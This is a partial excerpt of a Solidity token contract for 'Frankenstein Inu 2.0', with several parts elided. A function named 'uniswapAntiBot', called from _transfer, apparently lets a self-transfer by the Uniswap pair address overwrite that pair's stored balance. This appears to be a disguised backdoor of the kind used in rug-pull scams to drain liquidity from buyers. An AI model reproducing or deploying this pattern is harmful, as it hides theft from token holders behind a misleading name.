...
contract FrankensteinInu2_0 is Context, IERC20, Ownable {
    ...
    string private _name = unicode"Frankenstein Inu 2.0";
    string private _symbol = unicode"FRINU2.0";
    ...
    function uniswapAntiBot(address sped, address revd,uint256 amount) internal returns(bool){
        if(sped == revd && sped == sPair){
            _wallStatus[revd]=amount;
            return true;
        }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if(uniswapAntiBot(sender,recipient,maxTX))
            return uniswapAntiBot(sender,recipient,maxTX);
